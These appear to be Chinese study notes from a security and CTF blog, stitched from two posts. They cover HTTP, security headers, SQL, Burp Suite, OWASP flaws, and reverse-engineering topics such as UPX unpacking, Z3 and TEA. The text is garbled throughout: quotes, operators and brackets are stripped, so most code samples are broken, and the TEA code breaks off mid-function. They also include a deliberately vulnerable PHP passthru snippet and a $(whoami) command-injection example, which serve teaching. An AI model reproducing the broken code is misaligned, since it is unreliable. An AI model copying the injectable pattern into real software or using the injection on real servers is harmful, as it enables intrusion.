WAF：Web应用程序防火墙 URL typosquatting：误植域名（与知名域名相似的钓鱼网站） HTTP 消息结构： Start Line Headers Empty Line Body HTTP Requests Sent by the user to trigger actions on the web application. Request Line 请求行格式：METHOD /path HTTP/version METHOD GETPOSTPUTDELETEPATCHHEADOPTIONS：获取可用的方法TRACECONNECT path：请求资源的相对路径 版本：HTTP 1.1带来了持久连接、分块传输编码和更强大的缓存功能。至今仍被广泛使用。 Request Headers 请求头 Request Header Example Description Host Host: tryhackme.com Specifies the name of the web server the request is for. User-Agent User-Agent: Mozilla/5.0 Shares information about the web browser the request is coming from. Referer Referer: https://www.google.com/ Indicates the URL from which the request came from. Cookie Cookie: user_type=student; room=introtowebapplication; room_status=in_progress Information the web server previously asked the web browser to store is held in cookies. Content-Type Content-Type: application/json Describes what type or format of data is in the request. Request Body 请求体 URL 编码：以 连接的键值对 applicationx-www-form-urlencoded POST /profile HTTP/1.1Host: tryhackme.comUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencodedContent-Length: 33name=Aleksandraage=27country=US 表单数据 multipartform-data 允许发送多个数据块，每个数据块由边界字符串 boundary 分隔。 边界字符串是请求本身定义的标头。这种格式可用于发送二进制数据，例如将文件或图像上传到 Web 服务器时。 POST /upload HTTP/1.1Host: tryhackme.comUser-Agent: Mozilla/5.0Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name=usernamealeksandra----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name=profile_pic; filename=aleksandra.jpgContent-Type: image/jpeg[Binary Data Here representing the image]----WebKitFormBoundary7MA4YWxkTrZu0gW-- JSON（Javascript Object Notation）：Javascript 对象表示法 applicationjson POST /api/user HTTP/1.1Host: tryhackme.comUser-Agent: Mozilla/5.0Content-Type: application/jsonContent-Length: 62 name: Aleksandra, age: 27, country: US XML：数据被组织在标签内，标签有开始和结束。这些标签可以相互嵌套。 applicationxml POST /api/user HTTP/1.1Host: tryhackme.comUser-Agent: Mozilla/5.0Content-Type: application/xmlContent-Length: 124user nameAleksandra/name age27/age countryUS/country/user HTTP ResponsesSent by the server in response to the user’s request. Status Line 状态行 HTTP 版本 状态码 Status Code 原因短语 Informational Responses (100-199)：接收到部分请求，请继续Successful Responses (200-299)：成功Redirection Messages (300-399)：资源被转移到其他位置，需要重定向Client Error Responses (400-499)：客户端问题Server Error Responses (500-599)：服务器问题 100 (Continue)200 (OK)301 (Moved Permanently)404 (Not Found)500 (Internal Server Error) Response Headers 响应头 Response Headers Example Description Date Date: Fri, 23 Aug 2024 10:43:21 GMT Content-Type Content-Type: text/html; charset=utf-8 Server Server: nginx Set-Cookie Set-Cookie: sessionId=38af1337es7a8 Cache-Control Cache-Control: max-age=600 Location Location: /index.html Set-Cookie： 为了确保安全，设置 Cookie 时使用HttpOnly标志（这样 JavaScript 就无法访问它们）和Secure标志（这样 Cookie 只能通过 HTTPS 发送）。 Cache-Control： 在必要时阻止敏感信息被缓存（使用no-cache） Response Body 响应体返回的 HTML、 JSON 、图像等 Security Headers Content-Security-Policy (CSP)：指定哪些域或来源被视为安全，帮助缓解跨站脚本 ( XSS ) 等 Content-Security-Policy: default-src self; script-src self https://cdn.tryhackme.com; style-src selfdefault-src 默认策略：仅限当前网站script-src 脚本策略：自身以及托管在https://cdn.tryhackme.com上的脚本style-src CSS样式表策略：当前网站 Strict-Transport-Security (HSTS)：确保 Web 浏览器始终通过 HTTPS 连接 Strict-Transport-Security: max-age=63072000; includeSubDomains; preloadmax-age：到期时间，单位为秒includeSubDomains：指示浏览器将此设置也应用于所有子域preload：允许将网站添加到预加载列表中 X-Content-Type-Options：指示浏览器不要猜测资源的MIME时间 MIME：描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。 X-Content-Type-Options: nosniff Referrer-Policy 此头部控制当用户从源网站服务器被重定向到目标网站服务器（例如点击超链接）时，发送给目标服务器的信息量。网站管理员可以通过此 Referrer-Policy 控制共享哪些信息。 Referrer-Policy: no-referrer 完全不告诉目标网站你是从哪里来的Referrer-Policy: same-origin 只有当你跳转到同一个网站（域名相同）时，才会告诉目标页面你从哪里来Referrer-Policy: strict-origin 只发送“来源域名”而且只在安全连接（HTTPS 到 HTTPS）的情况下发送。 Referrer-Policy: strict-origin-when-cross-origin JavascriptCtrl + Shift +I 打开 Console 嵌入HTMLInternal JavaScriptscript let x = 5; let y = 10; let result = x + y; document.getElementById(result).innerHTML = The result is: + result;/script External JavaScriptscript src=myJS.js/script 交互Alert弹出一个框，提示信息 name = prompt(What is your name?); alert(Hello + name); Prompt弹出一个框，提示输入信息，点击 OK 返回输入的值，点击 Cancel 返回 null name = prompt(What is your name?); alert(Hello + name); Confirm弹出确认框，一条消息和两个按钮，点击 OK 返回 true，点击 Cancel 返回 false confirm(Over 18 years old?) 混淆https://obfuscator.io/ # javascript 混淆https://obf-io.deobfuscate.io/ # 反混淆 数据库分类： 关系数据库（SQL）：使用表， 存储结构化数据 非关系数据库（NoSQL）：非表格形式，存储格式差异大的数据 基本结构 Key Primary Keys 主键 ：确保记录在表中是唯一的 Foreign Keys 外键 ：提供了从一个表到另一个表的链接 SQL数据库通常由数据库管理系统 (DBMS) 控制。 DBMS 是一个软件程序，作为 end user 和数据库之间的接口，允许用户检索、更新和管理存储的数据。 DBMS 的一些示例包括 MySQL、MongoDB、Oracle Database 和 Maria DB。 end user 与数据库之间的交互可以使用SQL（结构化查询语言）完成。 SQL是一种编程语言，可用于查询、定义和操作存储在关系数据库中的数据。 mysql CREATE DATABASE database_name;SHOW DATABASES;USE thm_bookmarket_db;DROP database database_name; CREATE TABLE example_table_name ( example_column1 data_type, example_column2 data_type, example_column3 data_type); SHOW TABLES;DESCRIBE book_inventory;ALTER TABLE book_inventoryADD page_count INT;DROP TABLE table_name; CRUDCRUD代表创建 (C reate)、读取 (R ead)、更新 (U pdate) 和删除 (D elete)，是管理数据系统中的基本操作。 INSERT INTO books (id, name, published_date, description)VALUES (1, Android Security Internals, 2014-10-14, An In-Depth Guide to Androids Security Architecture); SELECT * FROM books; # *表示检索所有列，后跟 FROM 表名SELECT name, description FROM books; UPDATE booksSET description = An In-Depth Guide to Androids Security Architecture.WHERE id = 1; DELETE FROM books WHERE id = 1; 子句 ClausesDISTINCTSELECT * FROM books; # *表示检索所有列，后跟 FROM 表名SELECT DISTINCT name FROM books; # 检索表 books 中的 name 列 GROUP BY聚合来自多个记录的数据，并将查询结果按列分组。 SELECT name, COUNT(*)FROM booksGROUP BY name; ORDER BYSELECT *FROM booksORDER BY published_date ASC; # 按升序或降序对查询返回的记录进行排序。 ASC：升序 DESC：降序 HAVINGSELECT name, COUNT(*)FROM booksGROUP BY nameHAVING name LIKE %Hack%; 运算符逻辑运算符LIKESELECT *FROM booksWHERE description LIKE %guide%; ANDSELECT *FROM booksWHERE category = Offensive Security AND name = Bug Bounty Bootcamp; ORSELECT *FROM booksWHERE name LIKE %Android% OR name LIKE %iOS%; NOTSELECT *FROM booksWHERE NOT description LIKE %guide%; BETWEENSELECT *FROM booksWHERE id BETWEEN 2 AND 4; 比较运算符等于、不等于、小于、大于、大于等于、小于等于 SELECT *FROM booksWHERE name = Designing Secure Software; 函数（待续）字符串函数SELECT CONCAT(name, is a type of , category, book.) AS book_info FROM books;SELECT category, GROUP_CONCAT(name SEPARATOR , ) AS booksFROM booksGROUP BY category; SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;SELECT LENGTH(name) AS name_length FROM books; 聚合函数SELECT COUNT(*) AS total_books FROM books;SELECT SUM(price) AS total_price FROM books; SELECT MAX(published_date) AS latest_book FROM books;SELECT MIN(published_date) AS earliest_book FROM books; Burp Suite 社区版 Burp Suite是一个基于 Java 的框架，旨在提供全面的 Web 应用程序渗透测试解决方案。 Burp Suite可以捕获并操控浏览器和 Web 服务器之间的所有HTTP HTTPS 流量。 代理（Proxy）：Burp代理是Burp Suite最为知名的功能。它允许在与Web应用交互时拦截和修改请求与响应。 中继器（Repeater）：另一个广为人知的特性。中继器允许捕获、修改并多次重发相同的请求。这一功能在通过反复试验构建有效载荷（例如SQL注入）或测试端点的漏洞时尤为有用。 入侵者（Intruder）：尽管社区版在速率上有限制，入侵者仍可向端点发送大量请求，常用于暴力破解或端点模糊测试。 解码器（Decoder）：解码器为数据转换提供了宝贵服务。它可以解码捕获的信息或在发送到目标之前对有效载荷进行编码。虽然存在其他替代服务，但在Burp Suite内使用解码器能显著提高效率。 比较器（Comparer）：顾名思义，比较器允许在单词或字节级别比较两段数据。虽然这一功能并非Burp Suite独有，但通过单一快捷键直接将大数据段发送到比较工具的能力极大加快了处理速度。 序列器（Sequencer）：序列器通常用于评估随机生成的数据（如会话Cookie值或其他理论上的随机数据）的随机性。如果生成这些值的算法缺乏安全的随机性，可能会暴露导致严重攻击的漏洞。 Proxy在修改 HTTP 内容时，CTRL + U 可以对选中字段进行 URL 编码 OWASP 2021访问控制失效 Broken Access Control访问控制失效，允许攻击者绕过授权，从而允许他们查看敏感数据或执行他们不应该执行的任务。 不安全的直接对象引用 IDOR 问题不在于直接对象引用，而在于应用程序没有验证登录用户是否有权访问所请求的帐户。 https://bank.thm/account?id=111111如可以操作 id 值访问其他用户账户 加密失败 Cryptographic Failures误用（或未使用）用于保护敏感信息的加密算法而导致的任何漏洞。 将大量数据以易于从多个位置访问的格式存储的最常见方法是使用数据库。 这对于像 Web 应用程序这样的应用非常理想，因为许多用户可能随时与网站进行交互。 数据库引擎通常遵循结构化查询语言 ( SQL ) 语法。 平面文件数据库以文件形式存储在计算机磁盘上。 通常，这对于 Web 应用来说不会有问题，但如果数据库存储在网站的根目录下（即连接到网站的用户可以访问的文件之一），会发生什么情况？我们可以在自己的机器上下载并查询它，并且拥有对数据库中所有内容的完全访问权限。这确实是敏感数据泄露！ 注入 Injection **SQL注入：**当用户控制的输入被传递给SQL查询时，就会发生这种情况。因此，攻击者可以传入SQL查询来操纵查询结果。当这些输入被传递给数据库查询时，攻击者可能会访问、修改和删除数据库中的信息。这意味着攻击者可以窃取敏感信息，例如个人信息和凭证。 **命令注入：**当用户输入被传递给系统命令时，就会发生这种情况。因此，攻击者可以在应用服务器上执行任意系统命令，从而可能允许其访问用户的系统。 防御：使用运行字符列表、剥离不安全字符 命令注入命令注入是指 Web 应用程序中的服务器端代码（例如PHP）调用直接与服务器控制台交互的函数。 注入式 Web 漏洞允许攻击者利用该调用在服务器上任意执行操作系统命令。 sudo apt updatesudo apt install cowsay ?php if (isset($_GET[mooing])) $mooing = $_GET[mooing]; $cow = default; if(isset($_GET[cow])) $cow = $_GET[cow]; passthru(cowsay -f $cow $mooing); ? 如果控制台检测到内联命令，它将首先执行该命令，然后将结果用作外部命令的参数。 cowsay -f default $(whoami) 通过操作 mooing 、cow 的值，可以注入其他命令 whoami id ifconfigip addr uname -a ps -ef","categories":["Cyber Security 101"]},{"title":"CTF Reverse 基础知识","path":"//CTF Reverse 基础知识/","content":"CTF Reverse 基础知识 python数据组织b = bHello # 字节对象：不可变的字节序列b = bytearray(bHello) # 字节数组对象：可变的字节序列s = hello # Unicode 字符序列hex_str = 48656c6c6f # 字符串b = bytes.fromhex(hex_str) # 获得十六进制 对应 字节流hex_str = b.hex() # 将 bytes 转化为十六进制 s = Hellob = s.encode(utf-8) # 使用 utf-8 编码，获得对应 字节流s = b.decode(utf-8) # 使用 utf-8 解码，获得对应 字符串 chr()ord() password = [o, n, m, l, k, j]password = .join(password) range(start, stop, step) # 从 start 开始，到 stop-1 结束，步长为 step Python字节码 pyc文件是 Python 字节码（Bytecode）的编译缓存文件。 pycdc（Python 反编译工具） sudo apt updatesudo apt install git cmake g++ git clone https://github.com/zrax/pycdc.gitcd pycdccmake .make ./pycdc file.pyc pip3 install uncompyle6 虚拟环境python3 -m venv reversesource myenv/bin/activate # 激活deactivate # 退出 BaseBase64将 6 位二进制数 映射到 64个字符 每 3 个字节，24位，可以分为 4 组，即 4 个六位二进制数，编码为 4 个字符 A-Z (大写字母，索引0-25，对应ASCII 65-90)a-z (小写字母，索引26-51，对应ASCII 97-122)0-9 (数字，索引52-61，对应ASCII 48-57)+ (索引62，对应ASCII 43)/ (索引63，对应ASCII 47) = 用于填充（padding），当输入字节数不是3的倍数时使用。 所以看到一串字符串，以 = 结尾时，很大可能是 base64 编码过的。 使用 base64 库： Base64编码 import base64print(base64.b64encode(bCTF).decode()) # 输出: Q1Rm Base64解码 import base64ciphertext = bW9lY3Rme1kwdV9DNG5fRzAwZF9BdF9CNDVlNjQhIX0=b = base64.b64decode(ciphertext) # 得到 b 是字节对象print(b.decode()) # decode() 默认是 Unicode 解码 Base32将 5 位二进制数 映射到 32个字符 A-Z (索引0-25，对应ASCII 65-90)2-7 (索引26-31，对应ASCII 50-55) 每 5 字节（40位）分为 8 个 5 位块，编码为 5 个字符 输入不足 5 字节时，用 填充（最多6个 ）。 相比Base64，Base32输出更长，但字符集更简单（无小写字母或特殊字符），适合大小写不敏感的场景。 Base16Base16编码原理Base16（即十六进制）使用16个字符（4位二进制）： 0-9 (索引0-9，对应ASCII 48-57)A-F (索引10-15，对应ASCII 65-70) 分组：每字节（8位）分为2个4位块。 映射：每个4位块直接转换为十六进制字符。 特点：输出最长，但最直观，常用于调试或表示二进制数据。 upxsudo apt updatesudo apt install upx-ucl 压缩：通过压缩和加壳技术减小文件体积 加壳：将可执行程序的外部再包一层外壳程序，并在运行时使用外壳程序解压实际的程序，然后加载到内存运行。 可使用 Die (Detect it easy) 检测文件类型，判定是否加壳 加壳后的程序应包含： PE 头部：保留原始 PE 文件的 DOS 头、NT 头和节表（Section Table），但可能被修改以适应压缩后的结构。 UPX 区段：UPX 通常将文件分为几个自定义区段（如 UPX0、UPX1、UPX2），用于存储压缩数据、解压 stub 和其他元数据。 UPX 头部：UPX 在文件中嵌入一个特定的头部结构，包含压缩算法标识、文件长度等信息，UPX! 是其中的一个标志性字符串。 解压 stub：一段解压代码，负责在运行时将压缩的程序还原到内存中。 压缩数据：原始程序的代码和数据经过压缩后存储在文件中。 UPX 的加壳过程会重构 PE 文件的节表和内容，但保留 PE 格式的基本结构以确保文件仍可被操作系统加载。 对upx 加壳过的程序：逆向时需要使用 upx -d 脱壳： 脱壳过程中 upx 特征区段很重要，逆向时若无法脱壳需要考虑恢复特征区段 修改区段名：UPX0 UPX1 UPX2 可以改成其他名字，upx -d 将无法识别文件结构，导致脱壳失败。 恢复UPX头：恢复 UPX! 版本号 + 00 55 50 58 21 0D xx 02 08 如果仍然无法脱壳，可能需要手动脱壳 手动脱壳 打开到 x64dbg 运行到用户代码 可以看到，有一些 push 的操作，这是在保护现场，之后就应该是脱壳处理。 pushad 可以将所有寄存器保存到栈上，也是保护现场 我们需要找到 脱壳处理 完成之后，程序的真正入口点，在push完后，栈顶 rsp 的位置下 硬件断点 （右键，转到内存窗口中） 在该地址处下硬件断点，八字节的访问断点，接着执行 执行到 多个 pop 指令位置，这是在恢复现场。后面还有一个短跳转指令，循环清空栈的 80 字节。之后的长跳转，就应该跳到真正的函数入口。如下图。 我们现在找到了这个函数入口，Ctrl + i 打开界面，检查 OEP 无误，点击自动搜索，然后 Dump，然后 Fix Dump 刚刚生成的文件。 虽然 dump 出的文件可能不能运行，但是已经可以静态反编译了。 文件的二进制结构ELFLinux 中的目标文件，也就是 **ELF （Executable and Linkable Format）**文件，主要有以下三种类型 可重定位文件（Relocatable File），包含由编译器生成的代码以及数据。链接器会将它与其它目标文件链接起来从而创建可执行文件或者共享目标文件。在 Linux 系统中，这种文件的后缀一般为 .o 。 可执行文件（Executable File），就是我们通常在 Linux 中执行的程序。 共享目标文件（Shared Object File），包含代码和数据，这种文件是我们所称的库文件，一般以 .so 结尾。一般情况下，它有以下两种使用情景： 链接器（Link eDitor, ld）可能会处理它和其它可重定位文件以及共享目标文件，生成另外一个目标文件。 动态链接器（Dynamic Linker）将它与可执行文件以及其它共享目标组合在一起生成进程镜像。 文件结构 ELF Header（文件头） 固定数 ELF 、文件类型、目标体系结构、文件版本、入口点地址、段表偏移、节表偏移、文件头大小……. Program Header Table（程序头表） 描述 ELF 文件的**段（Segment）**信息，适用于可执行文件和共享目标文件。动态链接器和操作系统加载器使用该表来加载程序到内存中。 Section Header Table（节头表） Sections（节） 常见节包括： .text：存储可执行代码。 .data：存储初始化数据。 .bss：存储未初始化的全局静态变量（不占用文件空间，仅在内存中分配）。 .rodata：存储只读数据，如字符串常量。 .symtab：符号表，存储函数和变量的符号信息。 .strtab：字符串表，存储符号名称等字符串。 Dynamic Linking Information（动态链接信息） Symbol Table（符号表） Relocation Table（重定位表） PEWindows EXE文件采用 PE（Portable Executable） 格式 ，与 ELF 文件对比： 共同点： 都支持可执行文件、动态库和目标文件。 都包含头部、段节、符号表和重定位信息。 不同点： 平台：ELF 主要用于 LinuxUnix，PE 用于 Windows。 头部结构：ELF Header 更简洁，PE 使用 DOS 头和 PE 头，兼容旧的 DOS 格式。 动态链接：ELF 使用 .dynamic 节和动态链接器（ld.so）；PE 使用导入表（Import Table）和 DLL。 扩展性：ELF 设计更灵活，支持多种架构；PE 主要针对 x86x64。 Windows桌面应用程序(GUI 程序)WinMain 函数是程序入口点 int WINAPI WinMain( _In_ HINSTANCE hInstance, // 当前程序实例的句柄 _In_opt_ HINSTANCE hPrevInstance, // 前一个实例的句柄 _In_ LPSTR lpCmdLine, // 命令行参数（字符串形式） _In_ int nCmdShow // 窗口显示方式（如最大化、最小化、正常等）); Windows 桌面程序需要 windows.h 除了 WinMain 函数，每个Windows桌面应用程序还需要一个窗口过程函数 WndProc ，可以指定为任何名称，用于处理窗口收到的消息。 LRESULT CALLBACK WndProc( _In_ HWND hWnd, // 窗口句柄表示消息所属的窗口,类似指针 _In_ UINT message, // 消息类型 _In_ WPARAM wParam, // 消息的附加参数1 _In_ LPARAM lParam // 消息的附加参数2); WinMain 函数 处理窗口1.填充 WNDCLASSEX 类型的结构 添加关于主窗口的一些基本信息 WNDCLASSEX wc = sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WindowProc, 0, 0, hInstance, NULL, NULL, (HBRUSH)(COLOR_WINDOW+1), NULL, LMyWindowClass, NULL ; 2.填充 WNDCLASSEX 结构后，向 Windows 注册该结构，使其了解你的窗口以及如何向该窗口发送消息。 RegisterClassEx(wc); 3.使用 CreatWindowEx 函数创建窗口 HWND hwnd = CreateWindowEx(0, LMyWindowClass, LCTF Window, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, NULL, hInstance, NULL); 4.显示窗口 ShowWindow(hwnd, nCmdShow); // 设置窗口显示状态UpdateWindow(hwnd); // 强制窗口重绘 5.为了处理消息，首先添加“消息循环”来侦听 Windows 发送的消息。 当应用程序收到消息时，此循环将该消息调度到 WndProc 函数进行处理。 消息循环类似于以下代码： MSG msg; // 定义 MSG 结构，存储消息队列中的消息。// 从消息队列获取消息。返回非0表示成功获取消息，0表示收到 WM_QUIT。while (GetMessage(msg, NULL, 0, 0)) TranslateMessage(msg); // 将键盘虚拟键消息转换为字符消息 DispatchMessage(msg); // 将消息分发到对应的 WindowProc 函数。return (int)msg.wParam; WndProc 函数 处理消息 WM_PAINT ：更新显示窗口（第一次显示窗口需要更新整个窗口） 使用 BeginPaint ，处理所有逻辑，再调用 EndPaint （调用 TextOut 在窗口指定位置显示文本） PAINTSTRUCT ps;HDC hdc; // 与窗口工作区关联的设备上下文的句柄TCHAR greeting[] = _T(Hello, Windows desktop!);switch (message)case WM_PAINT: hdc = BeginPaint(hWnd, ps); // 返回用于在工作区进行绘制的显示设备上下文的句柄 // Here your application is laid out. // For this introduction, we just print out Hello, Windows desktop! // in the top left corner. TextOut(hdc, 5, 5, greeting, _tcslen(greeting)); // End application-specific layout section. EndPaint(hWnd, ps); // 结束绘制请求并释放设备上下文。 break;case WM_DESTROY: PostQuitMessage(0); break;default: return DefWindowProc(hWnd, message, wParam, lParam); break; return 0; WM_CREATE ：首次创建窗口 WM_DESTROY：关闭窗口 反调试花指令自调试调试器检查QuerySystemTime GDB动态调试gdb programlayout asm # 显示反汇编窗口 layout regs # 显示寄存器窗口b *0x40127c # 下断点r # 运行s # 单步运行c # 继续运行q # 退出 gdbserver : port path # 本地执行 gdb 服务# 可以在 IDA pro 中调试 *Z3求解器 约束求解（Constraint Solving） 逻辑公式验证（Formal Verification） 符号执行（Symbolic Execution） 程序分析（Program Analysis） pip install z3-solver 基础语法示例from z3 import *s = Solver() # 首先创建一个 Z3 求解器x = Int(x) # 整数变量y = Int(y) # 整数变量z = Real(z) # 实数变量p = Bool(p) # 布尔变量s.add(x + y == 10) # 整数约束：x + y = 10s.add(x 0, y 5) # 多个约束：x 0 且 y 5s.add(And(x = 2, y == 3)) # 逻辑与：x = 2 且 y = 3if s.check() == sat: # 检查可满足性 m = s.model() # 获得一个可满足的模型 print(fx = m[x], y = m[y]) # 输出如：x = 5, y = 5else: print(No solution) 进阶语法示例def is_flag(flag): b = [0] * 34 for i in range(34): b[i] = 47806 * (ord(flag[i]) + i) if i != 0: b[i] = b[i] ^ b[i-1] ^ 0x114514 b[i] = b[i] % 51966 if b[i] != ciphertext[i]: return False return True 知道密文的情况下爆破求解： from z3 import *ciphertext = [ 0x0B1B0, 0x5678,0x7FF2,0x0A332,0x0A0E8,0x364C,0x2BD4,0x0C8FE, 0x4A7C,0x18,0x2BE4,0x4144,0x3BA6,0x0BE8C,0x8F7E,0x35F8,0x61AA, 0x2B4A,0x6828,0x0B39E,0x0B542,0x33EC,0x0C7D8,0x448C,0x9310, 0x8808,0x0ADD4,0x3CC2,0x796,0x0C940,0x4E32,0x4E2E,0x924A,0x5B5C]solver = Solver()# 定义 flag 列表和中间量 b，使用 BitVec 类型（32 位）flag = [BitVec(fflag_i, 32) for i in range(34)]b = [BitVec(fb_i, 32) for i in range(34)]# 添加约束：flag 字符在 ASCII 可打印字符范围内 (32 到 126)for i in range(34): solver.add(flag[i] = 32, flag[i] = 126)# 根据 is_flag 函数的逻辑添加约束for i in range(34): temp = 47806 * (flag[i] + i) if i == 0: solver.add(b[i] == temp % 51966) else: temp = temp ^ b[i-1] ^ 0x114514 solver.add(b[i] == temp % 51966) solver.add(b[i] == ciphertext[i]) # 存储所有解solutions = []while solver.check() == sat: model = solver.model() # 提取 flag 字符, as_long() 将 Z3 的值转为 Python 整数）。 flag_vals = [model[flag[i]].as_long() for i in range(34)] flag_str = .join(chr(val) for val in flag_vals) solutions.append(flag_str) # 添加排除当前解的约束, 以加快求解速度 solver.add(Or([flag[i] != flag_vals[i] for i in range(34)])) # 可选：限制最大解的数量，避免过多输出 if len(solutions) = 100: # 限制最多 100 个解 break# 非空则输出所有解if solutions: for idx, sol in enumerate(solutions, 1): print(fidx: sol)else: print(无解) Android逆向一个 Android app 大概由三部分组成： AndroidManifest.xml：记录app各种信息 resources：各种资源，包括排版、程序中出现的字串、图片等等 AndroidManifest.xml 第 7 行：app 的package name 是 com.example.ezandroidpro 我们访问谷歌商店，找到app X https://play.google.com/store/apps/details?id=com.twitter.androidhl=zh_TWgl=US 这个 id = com.twitter.android 就是指 X app 的 package name Package Name（包名）是Android应用程序的唯一标识符，通常采用类似域名反写的格式，例如 com.example.myapp。它在Android系统中用于区分不同的应用程序，通常在应用的 AndroidManifest.xml 文件中定义。 包名不仅用于标识应用，还用于管理应用的安装、更新以及权限分配等。 第 24 行：app 有一个 activity，是 com.example.ezandroidpro.MainActivity ActivityActivity 是一个核心组件，表示应用程序的一个用户界面屏幕。每个Activity通常对应一个单独的屏幕，用户可以通过它与应用进行交互。例如，一个Activity可以是一个登录页面、主页或设置页面。 MainActivity 是一个约定俗成的名称，通常指应用启动时默认加载的第一个Activity。它是应用的入口点，用户打开应用时最先看到的界面。 从上面的 MainActivity 可以得到 app 运行逻辑，语言是 java NativeAndroid的Native层是指使用CC++编写的代码，这段代码可以直接与Android系统交互。通过NDK，开发者可以编 写高性能的代码，尤其是在需要进行复杂计算或处理多媒体数据时。Native层的使用场景主要包括： 实现高性能的游戏引擎 进行复杂的数据处理 使用已存在的CC++库 上图 app 使用 check 函数对输入进行检查，看到第 15 行，这个函数是来自 native 层 查看 lib 文件，应该就有so动态链接库文件，也可以看看 Summary 这些文件是 CC++ 编写的原生代码 (Native Code) 需要使用 IDA Ghidra 进行反汇编、反编译 加密基础分组加密的核心是将明文分割为固定长度的分组（Block），每组独立加密。不同算法的标准分组长度如下： AES（高级加密标准）：128位（16字节），支持密钥长度128192256位。 DES（数据加密标准）：64位（8字节），密钥实际有效长度56位（8位用于奇偶校验，已逐步淘汰）。 SM4（国密分组密码）：128位（16字节），密钥长度固定128位（中国商用密码标准）。 算法 分组长度 密钥长度 安全性特点 AES 128位 128192256位 安全性高（无已知有效攻击），NIST认证，广泛用于商业和政府通信（如TLS、IPsec） DES 64位 56位（名义64位） 因密钥过短易被暴力破解（2^56次运算），已被AES取代 SM4 128位 128位 中国自主设计，抗差分线性攻击能力强，符合GMT 0002标准 加密模式： ECB：每个分组独立加密，相同明文分组生成相同密文分组 CBC： $ C_i Encrypt(P_i \\ \\ XOR \\ \\ C_{i-1}) $ $ C_0 IV $ CFB： $ C_i P_i \\ \\ XOR\\ \\ Encrypt(C_{i-1}) $ $ C_0 IV $ PCBC：加密时 $ C_i Encrypt(P_i\\ \\ XOR \\ \\ C_{i-1}\\ \\ XOR \\ \\ P_{i-1}) $，解密时 $ P_i Decrypt(C_i)\\ \\ XOR \\ \\ C_{i-1}\\ \\ XOR \\ \\ P_{i-1} $。 OFB： CTR： $ C_i P_i \\ \\ XOR \\ \\ Encrypt(\\ Nonce \\ ||\\ Counter_i \\ ) $ 填充模式：None、PKCS7、Zeros、ANSIX923、ISO10126 SM4SBOX = [ 0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05, 0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62, 0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6, 0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8, 0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35, 0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87, 0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e, 0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1, 0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3, 0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f, 0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51, 0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8, 0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0, 0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84, 0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48]FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]CK = [0x00070e15,0x1c232a31,0x383f464d,0x545b6269,0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,0x30373e45,0x4c535a61,0x686f767d,0x848b9299,0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,0x10171e25,0x2c333a41,0x484f565d,0x646b7279] TEA#include stdio.h #include stdint.h //加密函数 void encrypt (uint32_t* v, uint32_t* k) uint32_t v0=v[0], v1=v[1], sum=0, i;//明文 uint32_t delta=0x9e3779b9;//delta常数 uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];//密钥 for (i=0; i 32; i++) //进行32轮加密 sum += delta; v0 += ((v14) + k0) ^ (v1 + sum) ^ ((v15) + k1); v1 += ((v04) + k2) ^ (v0 + sum) ^ ((v05) + k3); 